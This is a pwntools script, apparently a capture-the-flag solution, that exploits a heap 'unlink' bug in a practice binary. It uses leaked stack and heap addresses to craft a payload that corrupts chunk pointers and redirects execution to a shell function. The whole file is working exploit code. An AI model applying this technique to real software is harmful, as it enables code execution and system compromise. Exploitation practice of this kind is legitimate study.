from pwn import *


context.log_level = 'debug'


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    set confirm off
    # b unlink
    # b *0x80485e9
    b *0x80485ff
    layout regs
    continue
    ''')



def main():
    p = None
    # bin_path = '/home/unlink/unlink'
    bin_path = './unlink'
    e = ELF(bin_path)

    p = process(bin_path)
 #   p = start_gdb(bin_path)


    p.recvuntil('stack address leak: ')
    stack_leak = int(p.recvline(), base=16)
    p.recvuntil('heap address leak: ')
    heap_leak = int(p.recvline(), base=16)
    log.info('stack address: 0x{:08x}, heap address: 0x{:08x}'.format(stack_leak, heap_leak))
    ebp_minus_4 = stack_leak+0x10
    shell_address = e.symbols['shell']
    shell_address_location_on_heap = heap_leak+0xC  ## this is the start of A.buf
    # p.writeline(p32(shell_address) + cyclic(20) + p32(ebp_minus_4-4) + p32(shell_address_location_on_heap))
    p.writeline(p32(shell_address) + 'A' * 12 + p32(ebp_minus_4-4) + p32(shell_address_location_on_heap))

    p.interactive()


if __name__ == '__main__':
    main()

